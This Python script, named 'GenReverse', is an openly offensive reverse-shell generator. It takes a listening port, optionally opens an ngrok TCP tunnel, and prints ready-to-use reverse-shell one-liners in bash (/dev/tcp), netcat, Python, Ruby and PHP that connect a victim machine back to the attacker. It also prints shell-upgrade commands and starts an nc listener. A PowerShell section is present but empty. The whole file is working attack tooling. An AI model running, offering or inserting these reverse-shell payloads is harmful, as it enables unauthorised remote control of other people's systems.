from scapy.all import Ether, IP
import pyfiglet
from termcolor import colored
import time
import os
from pyngrok import ngrok

# banner
print(pyfiglet.figlet_format("GenReverse"))

ip1 = IP(dst="0.0.0.0").src
print(colored("####################################################", "blue"))
print(colored("\nYour IP :", "red"), "[",ip1,"]")

port = input("\nEnter the listening port : ")

def print_shell_commands(ip, port):
    print(colored("\n[BASH]", "blue"))
    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    print(colored("\n[NETCAT]", "blue"))
    print(f"nc -e /bin/sh {ip} {port}")
    print(colored("\n[PYTHON]", "blue"))
    print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    print(colored("\n[RUBY]", "blue"))
    print(f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    print(colored("\n[PHP]", "blue"))
    print(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(colored("\n[POWERSHELL]", "blue"))
    print(colored("\n#############################################", "blue"))
    print(colored("\nTo upgrade the shell use:", "blue"))
    print(colored("\npython -c 'import pty;pty.spawn(\"/bin/bash\")'", "red"))
    print(colored("\nOr", "blue"))
    print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
    print(colored("\nLaunching the listener...", "red"))
    time.sleep(2)
    os.system(f'\n\nsudo nc -lvnp{port}')

def usengrok():
    print("\nActivation of Ngrok..")
    time.sleep(2)
    connection = ngrok.connect(port, "tcp").public_url
    ssh, port1 = connection.strip("tcp://").split(":")
    print("\nUrl ngrok: ", ssh)
    print("Port ngrok: ", port1)
    print_shell_commands(ssh, port1)
    os.system('\n\nnc -lvp' + str(port))

def reverseShell():
    print_shell_commands(ip1, port)

def ip():
    a = input("\n1- Using Ngrok ?:\n2- Use this IP " + ip1 + " ?:\n\nMake your choice ? : ")
    if a == "1":
        usengrok()
    elif a == "2":
        reverseShell()
    elif a == "3":
        ip2 = input("choisie ton ip:?")
        ip2 = ip1
        reverseShell()
    elif a > "2":
        print("Aurevoir") 
    else:
        print("Faite un choix!")

ip()
